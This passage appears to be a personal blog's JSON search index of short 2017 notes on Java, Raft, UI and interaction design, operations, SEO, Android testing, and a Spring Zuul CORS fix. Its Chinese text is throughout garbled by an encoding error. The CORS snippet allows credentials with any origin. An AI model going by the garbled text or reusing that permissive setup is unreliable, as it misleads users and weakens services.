å¾ªç¯package test; public class Hello{ public static void main(String[] args) { int[] ia = new int[10]; for(int i=0; i&lt; ia.length;i++) { ia[i] = i; } for(int k : ia) { System.out.println(k); } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"raft","slug":"history/tech/5a2e3f8b863b4f2b5a550b67","date":"2017-12-10T20:19:23.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e3f8b863b4f2b5a550b67/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e3f8b863b4f2b5a550b67/","excerpt":"","text":"http://thesecretlivesofdata.com/raft/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java æƒé™å…³é”®å­—","slug":"history/tech/5a2e3b07863b4f2b5a550b66","date":"2017-12-10T20:00:07.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e3b07863b4f2b5a550b66/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e3b07863b4f2b5a550b66/","excerpt":"","text":"ç±»æˆå‘˜å¦‚æœä¸å¸¦ public é»˜è®¤æ˜¯ friendlyç±»åå¦‚æœæ˜¯ public (public class â€¦) ï¼Œåˆ™ç±»æ‰€å¤„çš„æ–‡ä»¶çš„æ–‡ä»¶åå¿…é¡»å’Œç±»åä¸€è‡´ã€‚ä¸€ä¸ª java æ–‡ä»¶åªèƒ½æœ‰ä¸€ä¸ª public çš„ç±»ï¼Œä¸æ˜¯ public çš„ç±»åªåœ¨åŒ…å†…æœ‰æ•ˆã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java å¼‚å¸¸","slug":"history/tech/5a2e2e72863b4f2b5a550b65","date":"2017-12-10T19:06:26.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e2e72863b4f2b5a550b65/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e2e72863b4f2b5a550b65/","excerpt":"","text":"å¼‚å¸¸å¯¹è±¡å¯ä»¥æŠ›å‡ºå¼‚å¸¸, æ“ä½œæ–¹æ³•å¦‚ä¸‹:String getMessage(); String toString(); String printStackTrace(); ä»€ä¹ˆå¯ä»¥æŠ›å‡ºï¼Ÿä»»ä½•ç»§æ‰¿äº† Throwable ç±»çš„å¯¹è±¡ Exception ç±»ç»§æ‰¿äº† Throwable throw new Exception(); throw new Exception(&quot;HELP&quot;); å¼‚å¸¸å£°æ˜é‡åˆ°ç»§æ‰¿å…³ç³»å½“è¦†ç›–ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œ å­ç±»ä¸èƒ½å£°æ˜æŠ›å‡ºæ¯”çˆ¶ç±»çš„ç‰ˆæœ¬æ›´å¤šçš„å¼‚å¸¸ åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­ï¼Œå¿…é¡»å£°æ˜çˆ¶ç±»å¯èƒ½æŠ›å‡ºçš„å…¨éƒ¨å¼‚å¸¸ package test; class OpenException extends Exception{} class CloseException extends OpenException{} class NewException extends Exception{} class Test { public Test() throws OpenException {} public void f() throws OpenException{} public static void main(String[] args) { } } public class Hello extends Test{ // å­ç±»çš„æ„é€ å‡½æ•°å¯ä»¥æ¯”çˆ¶ç±»æœ‰æ›´å¤šçš„å¼‚å¸¸ public Hello() throws OpenException, NewException { } // å­ç±»è¦†ç›–çˆ¶ç±»ï¼Œæˆå‘˜å‡½æ•°ä¸å…è®¸æ¯”å­ç±»æŠ›å‡ºæ›´å¤šç§ç±»çš„å¼‚å¸¸ public void f() throws OpenException{} public static void main(String[] args) { try { // å°†å­ç±»å¯¹è±¡å½“ä½œçˆ¶ç±»å¯¹è±¡çœ‹å¾… Test t = new Hello(); t.f(); } catch (OpenException e1) { // TODO Auto-generated catch block e1.printStackTrace(); }catch (NewException e2) { e2.printStackTrace(); } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ICON è®¾è®¡","slug":"history/ui/5a2d41cf863b4f2b5a550b61","date":"2017-12-10T02:16:47.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2d41cf863b4f2b5a550b61/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2d41cf863b4f2b5a550b61/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"ui è®¾è®¡ä½œä¸š","slug":"history/ui/5a2bec5f863b4f2b5a550b60","date":"2017-12-09T01:59:59.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2bec5f863b4f2b5a550b60/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2bec5f863b4f2b5a550b60/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"ui è®¾è®¡ç¢ç‰‡ç»†èŠ‚","slug":"history/ui/5a2bde06863b4f2b5a550b5f","date":"2017-12-09T00:58:46.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2bde06863b4f2b5a550b5f/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2bde06863b4f2b5a550b5f/","excerpt":"","text":"æ–‡å­—å·¦è¾¹è·ä¸€èˆ¬å’Œä¸Šä¸‹ä¸¤ä¸ªæ–‡æœ¬æ¡†ä¸€æ ·æ–‡å­—æ¡†å’ŒèƒŒæ™¯è‰²æ²¡æœ‰è¾¹ç•Œï¼Œå¯ä»¥ç»™æ–‡å­—æ¡†åŠ ä¸€ä¸ªå¸¦æœ‰ç¯å¢ƒè‰²çš„è¾¹æ¡†","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"å­¦ä¹ è®¾è®¡çš„æ€ç»´å¯¼å›¾","slug":"history/ui/5a2bda10863b4f2b5a550b5e","date":"2017-12-09T00:41:52.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2bda10863b4f2b5a550b5e/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2bda10863b4f2b5a550b5e/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"è®¾è®¡ç«™ç‚¹","slug":"history/ui/5a2bd9a0863b4f2b5a550b5d","date":"2017-12-09T00:40:00.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2bd9a0863b4f2b5a550b5d/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2bd9a0863b4f2b5a550b5d/","excerpt":"","text":"dribbblehttp://www.fubiz.netbehancehttps://www.artsy.net/ui ä¸­å›½behanceSnapseedç«™é…·èŠ±ç“£","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"web ç«¯è®¾è®¡","slug":"history/interactive/5a2b28e18630a50e58e14d9c","date":"2017-12-09T00:05:53.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2b28e18630a50e58e14d9c/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2b28e18630a50e58e14d9c/","excerpt":"","text":"ç½‘é¡µå¸ƒå±€é¡µé¢è®¾è®¡è‡ªé€‚åº”è®¾è®¡","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"ç§»åŠ¨è®¾è®¡æ¨¡å¼","slug":"history/interactive/5a2b28bb8630a50e58e14d9b","date":"2017-12-09T00:05:15.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2b28bb8630a50e58e14d9b/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2b28bb8630a50e58e14d9b/","excerpt":"","text":"å¯¼èˆªæ ‡ç­¾å¼å¯¼èˆª/æ»šåŠ¨å¼æ ‡ç­¾å¯¼èˆª åˆ†æ®µå¼å¯¼èˆª èˆµå¼å¯¼èˆª åˆ—è¡¨","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"ioså’Œå®‰å“è®¾è®¡è§„èŒƒ","slug":"history/interactive/5a2b28828630a50e58e14d9a","date":"2017-12-09T00:04:18.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2b28828630a50e58e14d9a/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2b28828630a50e58e14d9a/","excerpt":"","text":"éµå¾ªç§»åŠ¨å¹³å°çš„è®¾è®¡è§„èŒƒ","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"ui è®¾è®¡çš„å†…å®¹","slug":"history/ui/5a2bcb1a863b4f2b5a550b5c","date":"2017-12-08T23:38:02.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2bcb1a863b4f2b5a550b5c/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2bcb1a863b4f2b5a550b5c/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é¡µé¢çš„è®¾è®¡åŸåˆ™","slug":"history/interactive/5a2b891f863b4f2b5a550b5b","date":"2017-12-08T18:56:31.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2b891f863b4f2b5a550b5b/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2b891f863b4f2b5a550b5b/","excerpt":"","text":"è§†è§‰å¼•å¯¼ç”¨æˆ·é˜…è¯»ä¹ æƒ¯ å¯¹è§’çº¿æ³•åˆ™","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"é¡µé¢çš„ä»»åŠ¡ç›®æ ‡","slug":"history/interactive/5a2b8596863b4f2b5a550b5a","date":"2017-12-08T18:41:26.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2b8596863b4f2b5a550b5a/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2b8596863b4f2b5a550b5a/","excerpt":"","text":"ç¡®å®šé¡µé¢çš„ä»»åŠ¡ç›®çš„ä¿¡æ¯å…ƒç´ çš„ç»„ç»‡åˆ†ç±»å¯¹ç»„å—è¿›è¡Œæ’ç‰ˆå¸ƒå±€æƒè¡¡å¹³å°è§„èŒƒå’Œç”¨æˆ·çš„ä½¿ç”¨ä¹ æƒ¯é¡µé¢æ’ç‰ˆçš„è®¾è®¡éªŒè¯","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"è®¾è®¡éœ€æ±‚åˆ†æä¸æ–¹æ¡ˆé€‰æ‹©","slug":"history/interactive/5a2b84cc863b4f2b5a550b59","date":"2017-12-08T18:38:04.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2b84cc863b4f2b5a550b59/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2b84cc863b4f2b5a550b59/","excerpt":"","text":"ä¸šåŠ¡éœ€æ±‚ = ä¸šåŠ¡ç›®çš„(ä¸ºä»€ä¹ˆåšè¿™ä¸ªåŠŸèƒ½ï¼Ÿé—®é¢˜åœ¨å“ªï¼Ÿ) + ä¸šåŠ¡ç›®æ ‡(äº§å“æœŸæœ›çš„æˆæœ)ç”¨æˆ·éœ€æ±‚ = ç›®æ ‡ç”¨æˆ·(è°æ¥ä½¿ç”¨è¿™äº›åŠŸèƒ½ï¼Ÿç‰¹å¾ï¼Œç»éªŒ) + åœºæ™¯ + è¡Œä¸º + ä½“éªŒç›®æ ‡ç”¨æˆ·ä½“éªŒè·¯å¾„ = ç”¨æˆ·ä½¿ç”¨å‰ï¼Œä¸­ï¼Œåçš„æ¥è§¦ç‚¹ ï¼Œ ç¡®ä¿è®¾è®¡é—­ç¯ä¸šåŠ¡ç›®æ ‡è½¬åŒ–ä¸ºç”¨æˆ·è¡Œä¸º: å¦‚ä½•è®©ç›®æ ‡ç”¨æˆ·æ¥ä½¿ç”¨è®¾è®¡çš„åŠŸèƒ½ä¸šåŠ¡éœ€æ±‚ æ³¨å†Œ ä¸šåŠ¡ç›®çš„ ç”¨æˆ·ç®¡ç† ä¸šåŠ¡ç›®æ ‡ æé«˜æ³¨å†Œé¡µé¢è½¬åŒ–ç‡ ç”¨æˆ·è¡Œä¸º ç‚¹å‡»æ³¨å†ŒæŒ‰é’®","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"è¿è¥è¦æ±‚","slug":"history/operate/5a2a0c4150d13d3f764ddbaa","date":"2017-12-08T03:51:29.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5a2a0c4150d13d3f764ddbaa/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5a2a0c4150d13d3f764ddbaa/","excerpt":"","text":"ä¸ç”¨æˆ·è¿çš„æ›´è¿‘æŠŠç”¨æˆ·åˆ†çº§è¿è¥","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"Spring boot zuul ç½‘å…³è®¾ç½®è·¨åŸŸé—®é¢˜å¤§å‘","slug":"history/tech/5a2649ff50d13d3f764ddba8","date":"2017-12-04T19:25:51.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2649ff50d13d3f764ddba8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2649ff50d13d3f764ddba8/","excerpt":"","text":"å‰ååˆ†ç¦»é¡¹ç›®ï¼Œåœ¨ä½¿ç”¨zuul ä½œå¾®æœåŠ¡çš„ç½‘å…³çš„æ—¶å€™ã€‚éœ€è¦è®¾ç½®è·¨åŸŸé—®é¢˜ã€‚é™¤äº†è®¾ç½®CorsFilter è¿˜éœ€è¦é¢å¤–å¿½ç•¥é‡å¤å¤´æ–‡ä»¶çš„é…ç½®ã€‚ zuul.ignored-headers: Access-Control-Allow-Credentials, Access-Control-Allow-Origin å…·ä½“æ­¥éª¤ï¼š @Bean @Order public CorsFilter corsFilter() { final UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); final CorsConfiguration config = new CorsConfiguration(); //å…è®¸è·¨åŸŸ config.setAllowCredentials(true); config.addAllowedOrigin(&quot;*&quot;); config.addAllowedHeader(&quot;*&quot;); config.addAllowedMethod(&quot;OPTIONS&quot;); config.addAllowedMethod(&quot;HEAD&quot;); config.addAllowedMethod(&quot;GET&quot;); config.addAllowedMethod(&quot;PUT&quot;); config.addAllowedMethod(&quot;POST&quot;); config.addAllowedMethod(&quot;DELETE&quot;); config.addAllowedMethod(&quot;PATCH&quot;); source.registerCorsConfiguration(&quot;/**&quot;, config); return new CorsFilter(source); } zuul: ignored-headers: Access-Control-Allow-Credentials, Access-Control-Allow-Origin","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"windows å‘½ä»¤è¡Œå·¥å…·","slug":"history/tech/5a24bf2f50d13d3f764ddba7","date":"2017-12-04T03:21:19.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a24bf2f50d13d3f764ddba7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a24bf2f50d13d3f764ddba7/","excerpt":"","text":"å®˜æ–¹ç½‘å€http://cmder.net","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®‰å“è‡ªåŠ¨åŒ–æµ‹è¯•","slug":"history/tech/5a23878d50d13d3f764ddba6","date":"2017-12-02T17:11:41.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a23878d50d13d3f764ddba6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a23878d50d13d3f764ddba6/","excerpt":"","text":"å®‰å“å·¥å…·åŒ…å®‰è£…å®Œ android studioä»¥åï¼Œå®‰è£… sdkï¼Œåˆ™ä¸€ä¸‹è·¯å¾„ä¼šåŒ…å«ç›¸åº”çš„å·¥å…·åŒ…adb:C:\\Users\\Administrator\\AppData\\Local\\Android\\Sdk\\platform-tools uiautomatorviewer.bat:C:\\Users\\Administrator\\AppData\\Local\\Android\\Sdk\\tools\\bin appium æµ‹è¯•æ¡†æ¶å®‰è£…å®˜ç½‘:http://appium.io/ å®‰è£… appium python å®¢æˆ·ç«¯pip install Appium-Python-Client æ¨èç½‘ç«™testclasstesterhome","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è¿è¥å·¥ä½œå†…å®¹","slug":"history/operate/5a22244650d13d3f764ddb9f","date":"2017-12-02T03:55:50.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5a22244650d13d3f764ddb9f/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5a22244650d13d3f764ddb9f/","excerpt":"","text":"è¿è¥å†…å®¹åŒ…æ‹¬:è¥é”€ ç­–åˆ’ æ–‡æ¡ˆ ç¼–è¾‘ æ¨å¹¿ ä¼ æ’­ ç”¨æˆ·ç®¡ç† æ´»åŠ¨ äº§å“æœºåˆ¶ æ‹“å±•/é”€å”® è¿è¥å§‹ç»ˆéœ€è¦å…³æ³¨ä¸¤ä¸ªåˆ†æ”¯æ•°æ®æ–¹å‘:æ•°æ®åˆ†æ ç”¨æˆ·åé¦ˆ æ½œåœ¨äº§å“æ–¹å‘ éœ€æ±‚æç‚¼ å†…å®¹æ–¹å‘è¿è¥å†…å®¹è¿è¥å²—ä½:ç¼–è¾‘ï¼Œè®°è€…ï¼Œç¤¾åŒºè¿è¥ï¼Œæ–°åª’ä½“è¿è¥ ç”¨æˆ·æ–¹å‘è¿è¥ç”¨æˆ·è¿è¥å²—ä½:æ¨å¹¿ï¼Œç¾¤è¿è¥ï¼Œç¤¾åŒºè¿è¥ï¼Œæ ¸å¿ƒç”¨æˆ·è¿è¥ æ´»åŠ¨è¿è¥","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"æœç´¢å¼•æ“è¥é”€","slug":"history/tech/5a2276a850d13d3f764ddba5","date":"2017-12-01T21:47:20.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a2276a850d13d3f764ddba5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2276a850d13d3f764ddba5/","excerpt":"","text":"http://sem.baidu.com/ æœç´¢å¼•æ“æäº¤é¡µé¢:ç™¾åº¦:http://ziyuan.baidu.com/linksubmit/urlgoogleï¼šhttps://www.google.com/webmasters/tools/submit-url?hl=zh-CN&amp;pli=1 æœç´¢ç»“æœé¡µåˆ†ä¸º:æ ‡é¢˜ &lt;title&gt; å†…å®¹ å¦‚æœç½‘é¡µå†…å®¹åŒ…å« meta æè¿°æ ‡ç­¾: è¿™ä¸ªæ ‡ç­¾çš„å†…å®¹å°±ä¼šä½œä¸ºæœç´¢ç»“æœçš„æè¿°ï¼Œ æ§åˆ¶åœ¨70ä¸ªæ±‰å­—å·¦å³ å¦‚æœç½‘é¡µå†…å®¹ä¸åŒ…å« meta æ ‡ç­¾: æœç´¢å¼•æ“ä¼šæŠ“å–ç½‘é¡µä¸­çš„ä¸€å°æ®µæ–‡å­—æ˜¾ç¤ºï¼Œå½“ç½‘é¡µå†…å®¹åŒ…å«äº†æœç´¢è€…æœç´¢çš„å…³é”®è¯çš„æ—¶å€™ï¼Œ æœç´¢å¼•æ“ä¼šæŠ“å–å†…å®¹é‡Œé¢ç¬¬ä¸€æ¬¡å‡ºç°å…³é”®è¯çš„é™„è¿‘çš„ä¸€å°æ®µæ–‡å­—ï¼Œç„¶åç”¨å®ƒä½œä¸ºæœç´¢ç»“æœçš„æè¿° é“¾æ¥ ç½‘é¡µçš„åœ°å€ä½œä¸ºæœç´¢ç»“æœçš„åœ°å€ æé«˜é¡µé¢æ’å é¡µé¢æ ‡é¢˜ä¼˜åŒ–é¡µé¢æ ‡é¢˜å½±å“å…³é”®è¯æ’å é¡µé¢æ ‡é¢˜ä¸­éœ€è¦åŒ…å«å…³é”®è¯ é¡µé¢æ ‡é¢˜ä¸ç½‘é¡µå†…å®¹ç›¸å…³ ç½‘ç«™çš„æ¯ä¸ªé¡µé¢æ ‡é¢˜éƒ½è¦ä¸åŒ æé«˜å†…å®¹çš„ç›¸å…³ç¨‹åº¦åœ¨å†…å®¹ä¸­å‡ºç°å…³é”®è¯ï¼Œå¹¶å°½é‡è®©å…³é”®è¯å¤šå‡ºç°å‡ æ¬¡ï¼Œä¸€èˆ¬åœ¨ä¸€ä¸ªé¡µé¢å†…ï¼Œå‡ºç° 2~3 æ¬¡æƒ³è¢«æœç´¢çš„å…³é”®è¯æ˜¯åˆé€‚çš„ å…³é”®è¯å‡ºç°çš„ä½ç½®å½±å“æ’åï¼Œæœ€å¥½åœ¨å†…å®¹æœ€å¼€å§‹çš„ä½ç½®å‡ºç°å…³é”®è¯ å†…å®¹ä¸­ä½¿ç”¨ä¸å…³é”®è¯ç›¸å…³çš„è¯æ±‡(ä½¿ç”¨å…³è”è¯æ±‡) åœ¨æ®µè½æ ‡é¢˜ä¸­åŒ…å«å…³é”®è¯ æ ‡é¢˜ä¸€æœ€é‡è¦ï¼Œ å…¶æ¬¡æ˜¯æ ‡é¢˜äºŒ å¼ºè°ƒåŠ ç²—æ˜¾ç¤ºå…³é”®è¯ ç½‘ç«™å†…éƒ¨é“¾æ¥ æé«˜ç½‘ç«™å†…å®¹çš„æƒå¨åº¦å¤–éƒ¨é“¾æ¥ æ•°é‡ è´¨é‡ å†…å®¹ç›¸å…³(å¤–éƒ¨å†…å®¹å’Œæ–‡ç« å†…å®¹ç›¸å…³) è®¾è®¡ä¼˜åŒ–æ£€æµ‹ç½‘ç«™https://validator.w3.orgä½¿ç”¨ç°ä»£çš„htmlç½‘é¡µå¸ƒå±€ä¸è¦ä½¿ç”¨ table æ ‡ç­¾ï¼Œ è¦ä½¿ç”¨åŸºäº css çš„å¸ƒå±€æ–¹å¼ ä¼˜åŒ–ç½‘é¡µçš„æ€§èƒ½ ä¼˜åŒ–ç½‘é¡µçš„æ•ˆæœ(å¯ç”¨æ€§) å¼•èµ·æ³¨æ„ å‹¾èµ·å…´è¶£ æ¸´æœ›å¾—åˆ° é‡‡å–è¡ŒåŠ¨ å…³é”®è¯ä¼˜åŒ–æ”¾å¼ƒé«˜é¢‘ä»˜è´¹å…³é”®è¯ï¼Œå…³æ³¨ä¸å¤ªçƒ­é—¨ï¼Œä½†æ˜¯çš„ç¡®æœ‰äººæœç´¢çš„å…³é”®è¯ å…³é”®è¯ä¸ç™»å½•é¡µ(landing page)å¯¼èˆªå‹æœç´¢è€… &quot;æˆ‘çŸ¥é“æˆ‘æƒ³è¦çš„&quot; æ¯”å¦‚è¯´ä»–æœç´¢ æ·˜å®ç½‘, å°†ç½‘ç«™é¦–é¡µè®¾ç½®ä¸ºç™»å½•é¡µ ä¿¡æ¯å‹çš„æœç´¢è€… &quot;ç»™æˆ‘åä¸ªé€‰æ‹©ä½ çš„ç†ç”±ï¼&quot; æœç´¢è€…æœç´¢ è‹¹æœç”µè„‘ä»€ä¹ˆå‹å·å¥½ï¼Œ è¿™ç±»æœç´¢è€…éœ€è¦ä¸€äº›è¯„æµ‹æˆ–è€…å¯¹æ¯”çš„å†…å®¹ä½œä¸ºç™»å½•é¡µ è¿™ç±»å‹çš„æœç´¢è€…ä¸ä¼šç›´æ¥è´­ä¹°ï¼Œä»–ä»¬ä¼šå­¦ä¹ 